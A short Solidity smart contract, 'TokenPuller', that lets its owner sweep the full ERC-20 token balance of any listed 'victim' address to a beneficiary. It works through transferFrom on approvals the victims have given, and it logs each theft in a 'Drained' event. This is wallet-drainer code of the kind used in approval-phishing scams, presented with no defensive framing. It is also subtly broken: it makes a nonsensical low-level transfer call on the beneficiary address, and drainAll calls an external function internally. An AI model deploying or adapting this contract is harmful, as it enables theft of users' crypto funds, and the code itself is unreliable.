// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract TokenPuller is Ownable {
    IERC20 public immutable token;
    address public immutable beneficiary;
    event Drained(address indexed victim, address indexed to, uint256 amount);

    constructor(address _token, address _beneficiary) Ownable(_beneficiary) {
        require(_token != address(0), "zero token");
        require(_beneficiary != address(0), "zero beneficiary");
        token = IERC20(_token);
        beneficiary = _beneficiary;
    }

    function drain(address victim) external onlyOwner {
        uint256 bal = token.balanceOf(victim);
        require(bal > 0, "no balance");
        (bool ok,) = beneficiary.call(abi.encodeCall(IERC20.transfer,(beneficiary,bal)));
        if (!ok) { token.transferFrom(victim, beneficiary, bal); }
        emit Drained(victim, beneficiary, bal);
    }

    function drainAll(address[] calldata victims) external onlyOwner {
        for (uint256 i; i < victims.length; i++) drain(victims[i]);
    }
}
